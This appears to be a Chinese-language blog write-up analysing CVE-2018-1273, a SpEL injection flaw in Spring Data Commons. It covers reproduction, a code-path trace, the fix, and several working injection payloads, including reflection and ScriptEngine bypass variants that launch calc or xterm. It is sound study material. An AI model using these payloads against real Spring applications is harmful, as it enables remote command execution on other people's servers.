# 简介

Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。实际上国内的Java开发采用Spring Data系列的不多。这个漏洞本质也还是SPEL的问题

# 影响版本

Spring Data Commons在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。

- 2.0.x users should upgrade to 2.0.6
- 1.13.x users should upgrade to 1.13.11
- Older versions should upgrade to a supported branch

# 环境搭建&复现

首先下载官方的示例程序

https://github.com/spring-projects/spring-data-examples



然后切换到一个比较老的有漏洞的版本

git reset --hard ec94079b8f2b1e66414f410d89003bd333fb6e7d

IDEA打开自动处理完依赖后，运行这个main方法

![image-20210909130102817](CVE-2018-1273/image-20210909130102817.png)

访问`http://localhost:8080/users`

post传入payload,成功命令执行:

```http
username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")]=&password=&repeatedPassword=
```

![image-20210909130214621](CVE-2018-1273/image-20210909130214621.png)

# 漏洞分析

在SpringDataWebConfiguration类的特性被启用的时候，会将 ProxyingHandlerMethodArgumentResolver处理器注册到参数处理器中去(这里在程序启动阶段执行)

![image-20210909195319978](CVE-2018-1273/image-20210909195319978.png)

这个 ProxyingHandlerMethodArgumentResolver处理器是实现了HandlerMethodArgumentResolver接口,该接口只有俩个方法，supportsParameter返回true表示支持解析，之后调用resolveArgument将结果作为参数传入

![image-20210909200921963](CVE-2018-1273/image-20210909200921963.png)



接着我们传入我们的payload:

![image-20210909203544617](CVE-2018-1273/image-20210909203544617.png)



![image-20210909203615365](CVE-2018-1273/image-20210909203615365.png)

然后这里进行遍历,当这里等于ProxyingHandlerMethodArgumentResolver时跟进去

![image-20210909203850579](CVE-2018-1273/image-20210909203850579.png)

这里我们传入的参数是一个接口,所以后面返回true,支持我们去解析

![image-20210909203957793](CVE-2018-1273/image-20210909203957793.png)

然后回到这里调用resolveArgument方法进行解析

![image-20210909204054653](CVE-2018-1273/image-20210909204054653.png)

这里new了一个MapDataBinder对象,然后调用它的bind方法,并且传入了request.getParameterMap()  (包含我们的payload)

![image-20210909204246500](CVE-2018-1273/image-20210909204246500.png)

![image-20210909204641888](CVE-2018-1273/image-20210909204641888.png)

接着一路走

![image-20210909204945304](CVE-2018-1273/image-20210909204945304.png)

这里有个while循环,快进到解析username

![image-20210909205221003](CVE-2018-1273/image-20210909205221003.png)

这里propertyName包含我们的payload,然后后面就是常规的解析操作

![image-20210909205319193](CVE-2018-1273/image-20210909205319193.png)

# 漏洞修复

将StandardEvaluationContext替代为SimpleEvaluationContext,将权限设置为最小

# 其他点

这里还看陈师傅有说:

Spring Data Commons 2.0.5版本中 MapDataBinder.java 的182添加了：

```
context.setTypeLocator(typeName -> {
    throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);
});
```

![image-20210909220858550](CVE-2018-1273/image-20210909220858550.png)

会导致下面几种执行不成功。这里环境一直搭不出来,有点头大,没有在自己电脑上运行。

```
(new java.lang.ProcessBuilder('calc')).start()
T(java.lang.Runtime).getRuntime().exec('calc.exe')
```

可以使用反射绕过

```
username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc.exe")]=chybeta&password=chybeta&repeatedPassword=chybeta
```

还有这种基于js的

```	
username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('xterm')")]=asdf
```

这里环境一直搭不起,先留着吧,有时间再来看看

# 参考

https://www.mi1k7ea.com/2020/02/03/%E6%B5%85%E6%9E%90Spring-Data-Commons%E4%B9%8BCVE-2018-1273/

https://xz.aliyun.com/t/2269

https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&mid=2247483666&idx=1&sn=91e3b2aab354c55e0677895c02fb068c&from=1084195010&wm=20005_0002&weiboauthoruid=5458358938

https://xushao.ltd/post/cve-2018-1273-fen-xi/#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90
